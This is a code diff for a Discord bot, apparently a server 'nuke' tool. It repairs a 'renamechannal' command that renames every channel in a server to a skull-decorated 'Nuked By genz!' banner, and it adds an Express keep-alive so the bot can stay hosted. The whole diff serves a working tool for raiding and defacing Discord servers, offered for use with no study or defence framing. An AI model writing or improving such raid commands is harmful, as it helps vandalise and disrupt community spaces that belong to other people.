@@ -147,19 +147,28 @@ client.on("messageCreate", async (message) => {
     message.channel.send(text);
   }
 
-// ========================
-  // Renamechannal
-  // ========================
+// ======================
+// Rename Channel Command
+// ======================
+
 if (command === "renamechannal") {
 
-  await message.reply("🔄 Renaming all channels to genz...");
+  await message.reply("🔄 Renaming all channels to 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!");
 
   await Promise.all(
     message.guild.channels.cache.map(channel =>
       channel.setName("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!").catch(() => {})
     )
   );
-    const express = require("express");
+}
+
+}); // ← closes client.on("messageCreate")
+
+// ======================
+// Express Keep Alive (Render)
+// ======================
+
+const express = require("express");
 const app = express();
 
 app.get("/", (req, res) => {
@@ -171,6 +180,7 @@ app.listen(3000, () => {
 });
 
 client.login(process.env.TOKEN);
+
 
 
 
